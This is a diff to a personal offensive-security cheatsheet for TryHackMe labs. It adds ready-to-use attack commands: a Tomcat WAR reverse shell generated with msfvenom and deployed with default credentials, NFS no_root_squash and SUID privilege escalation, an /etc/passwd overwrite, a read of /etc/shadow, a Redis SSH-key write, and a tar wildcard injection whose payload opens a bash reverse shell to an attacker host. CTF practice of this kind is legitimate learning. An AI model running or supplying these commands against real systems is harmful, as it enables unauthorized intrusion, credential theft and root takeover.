@@ -12,6 +12,8 @@ Personal cheatsheet of frequently used commands across TryHackMe engagements. Or
 - [LFI / Path Traversal](#-lfi--path-traversal)
 - [Shells](#-shells)
 - [SSH](#-ssh)
+- [SMB, NFS & Network Services](#-smb-nfs--network-services)
+- [Service Exploitation](#-service-exploitation)
 - [Hash Cracking](#-hash-cracking)
 - [Steganography](#%EF%B8%8F-steganography)
 - [Privilege Escalation — Linux](#%EF%B8%8F-privilege-escalation--linux)
@@ -69,6 +71,23 @@ curl -skL http://<target>/path
 
 # Binary-safe output (required for PHP filter chain RCE)
 curl "http://<target>/path" --output -
+```
+
+### wpscan
+
+```bash
+# Enumerate users, vulnerable plugins/themes, DB exports
+wpscan --url http://<target> --api-token $WPTOKEN -e u,vp,vt,dbe
+
+# Password bruteforce against enumerated users
+wpscan --url http://<target> -U users.txt -P /usr/share/wordlists/rockyou.txt
+```
+
+### cadaver — WebDAV
+
+```bash
+cadaver http://<target>/webdav
+# interactive: ls, put <file>, get <file>, mput, mget
 ```
 
 ---
@@ -188,6 +207,113 @@ ssh -L <localport>:127.0.0.1:<remoteport> <user>@<target>
 
 ---
 
+## 🖧 SMB, NFS & Network Services
+
+### SMB Enumeration
+
+```bash
+# List shares (anonymous)
+smbclient -L //<target> -N
+
+# Connect to share
+smbclient //<target>/<share> -N
+smbclient //<target>/<share> -U <user>
+
+# Recursive download
+smbclient //<target>/<share> -N -c 'recurse ON; prompt OFF; mget *'
+
+# enum4linux — full SMB enumeration
+enum4linux -a <target>
+```
+
+### NetExec (nxc)
+
+```bash
+# SMB command execution
+nxc smb <target> -u <user> -p <pass> -x '<command>'
+
+# Check password spray / valid creds
+nxc smb <target> -u users.txt -p passwords.txt
+
+# Enumerate shares
+nxc smb <target> -u <user> -p <pass> --shares
+```
+
+### NFS
+
+```bash
+# Show NFS exports
+showmount -e <target>
+
+# Mount NFS share
+sudo mount -t nfs <target>:/<export> /mnt/nfs
+
+# no_root_squash exploitation — run as root on attacker, writes land as root on target
+sudo cp /bin/bash /mnt/nfs/bash
+sudo chmod +s /mnt/nfs/bash
+# on target:
+/tmp/bash -p
+```
+
+### Redis
+
+```bash
+# Connect
+redis-cli -h <target>
+
+# Check config / webroot
+CONFIG GET dir
+CONFIG GET dbfilename
+
+# Write SSH key via Redis (if running as root or can write to homedir)
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SET pwn "\n\n<pubkey>\n\n"
+SAVE
+```
+
+### Domain / Kerberos Enumeration
+
+```bash
+# Username enumeration against Kerberos
+kerbrute userenum -d <domain> users.txt --dc <dc-ip>
+
+# SID brute-force to enumerate domain users (works with guest/null session)
+impacket-lookupsid <domain>/guest@<target>
+impacket-lookupsid <domain>/guest@<target> | grep SidTypeUser
+```
+
+---
+
+## 🔧 Service Exploitation
+
+### Tomcat — WAR File Upload RCE
+
+```bash
+# Generate WAR reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+
+# Upload via Manager (default creds: tomcat:s3cret)
+curl -u tomcat:s3cret -T shell.war http://<target>:8080/manager/text/deploy?path=/shell
+
+# Trigger
+curl http://<target>:8080/shell/
+```
+
+### GPG — Decrypt and Crack
+
+```bash
+# Import and decrypt (if passphrase known)
+gpg --import private.asc
+gpg --decrypt file.pgp
+
+# Crack passphrase with john
+gpg2john private.asc > gpg.hash
+john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+---
+
 ## 🔐 Hash Cracking
 
 ### hashcat
@@ -234,6 +360,10 @@ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
 # SSH key
 ssh2john id_rsa > id_rsa.hash
 john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# GPG private key
+gpg2john private.asc > gpg.hash
+john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ### openssl — Generate password hash for /etc/passwd
@@ -293,6 +423,47 @@ ls -la /etc/cron*
 ss -ntlp
 ```
 
+### SUID Binary Abuse
+
+```bash
+# SUID Python
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# SUID xxd — /etc/passwd overwrite
+cp /etc/passwd /tmp/newpasswd
+echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
+cat /tmp/newpasswd | xxd | /opt/xxd -r - /etc/passwd
+su - hacker
+
+# SUID xxd — arbitrary file read
+/opt/xxd /etc/shadow | xxd -r
+```
+
+### Writable Cron Script
+
+```bash
+# Append reverse shell or chmod to script executed by root cron
+echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
+
+# Wait for cron to fire
+watch -n 1 ls -lah /bin/bash
+
+# Trigger SUID bash
+/bin/bash -p
+```
+
+### Tar Wildcard Injection
+
+```bash
+# If root cron runs: tar -czf backup.tgz /path/*
+# Create flag files in that directory to inject tar options
+cd /path/to/watched/dir
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > shell.sh
+```
+
 ### Systemd Timer / Service Abuse
 
 ```bash
@@ -304,19 +475,17 @@ sudo /bin/systemctl daemon-reload
 sudo /bin/systemctl restart <name>.timer
 ```
 
-### SUID xxd — /etc/passwd Overwrite
+### NFS no_root_squash
 
 ```bash
-cp /etc/passwd /tmp/newpasswd
-echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
-cat /tmp/newpasswd | xxd | /opt/xxd -r - /etc/passwd
-su - hacker
-```
+# On attacker (as root) — plant SUID bash on the export
+sudo mount -t nfs <target>:/<export> /mnt/nfs
+sudo cp /bin/bash /mnt/nfs/bash
+sudo chmod +s /mnt/nfs/bash
+sudo umount /mnt/nfs
 
-### SUID xxd — Arbitrary File Read
-
-```bash
-/opt/xxd /etc/shadow | xxd -r
+# On target
+/path/to/export/bash -p
 ```
 
 ### authorized_keys Injection
@@ -409,7 +578,6 @@ whoami /priv | findstr /i "impersonate"
 ### Unquoted Service Paths
 
 ```powershell
-# Find unquoted paths with spaces
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'
 ```
 
@@ -426,7 +594,6 @@ accesschk.exe -kw "HKLM\System\CurrentControlSet\Services\<service>"
 ### Pass-the-Hash
 
 ```bash
-# impacket
 impacket-psexec <domain>/<user>@<target> -hashes :<nthash>
 impacket-wmiexec <domain>/<user>@<target> -hashes :<nthash>
 impacket-smbexec <domain>/<user>@<target> -hashes :<nthash>
@@ -439,14 +606,14 @@ impacket-smbexec <domain>/<user>@<target> -hashes :<nthash>
 impacket-secretsdump <domain>/<user>:<password>@<target>
 impacket-secretsdump -hashes :<nthash> <domain>/<user>@<target>
 
-# DCSync (from domain-joined or with DA creds)
+# DCSync
 impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc-ip>
 ```
 
 ### AS-REP Roasting / Kerberoasting
 
 ```bash
-# AS-REP roasting (no pre-auth required)
+# AS-REP roasting
 impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
 
 # Kerberoasting
